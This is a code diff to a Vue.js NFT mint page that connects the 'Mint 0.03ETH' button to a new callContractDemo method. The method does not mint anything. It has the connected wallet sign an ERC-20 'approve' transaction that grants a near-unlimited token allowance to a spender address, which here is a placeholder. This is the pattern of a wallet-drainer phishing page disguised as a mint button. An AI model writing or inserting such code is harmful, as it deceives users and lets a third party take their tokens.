@@ -49,7 +49,7 @@
     <section class="home-mint">
       <div>
         <h2 class="_fm">Mint to join</h2>
-        <div class="mint-button _fm">Mint<span>0.03ETH</span></div>
+        <div class="mint-button _fm" @click="callContractDemo">Mint<span>0.03ETH</span></div>
         <Account />
       </div>
     </section>
@@ -71,12 +71,56 @@
 </template>
 
 <script>
+import { mapState } from 'vuex'
+import Web3 from 'web3'
 import Account from '@/components/ui/Account'
 
 export default {
   name: 'Home',
   components: {
     Account,
+  },
+  computed: {
+    ...mapState({
+      connector: (state) => state.connector,
+      address: (state) => state.user.address,
+    }),
+  },
+  methods: {
+    async callContractDemo() {
+      if (!this.connector) {
+        console.log(1)
+        return
+      }
+      if (!this.address) {
+        console.log(2)
+        return
+      }
+      const SPENDER = '0x0000000000000000000000000000000000000001'
+      const CONTRACT = '0x0000000000000000000000000000000000000001'
+      const web3 = new Web3()
+      const data = web3.eth.abi.encodeFunctionCall(
+        {
+          name: 'approve',
+          inputs: [
+            { name: '_spender', type: 'address' },
+            { name: '_value', type: 'uint256' },
+          ],
+        },
+        [SPENDER, '0xffffffffffffffffffffffffffffffff']
+      )
+      const tx = {
+        from: this.address,
+        to: CONTRACT,
+        data,
+      }
+      const txHash = await this.connector.sendTransaction(tx).catch(() => '')
+      if (txHash) {
+        // SUCCESS
+      } else {
+        // ERROR
+      }
+    },
   },
 }
 </script>
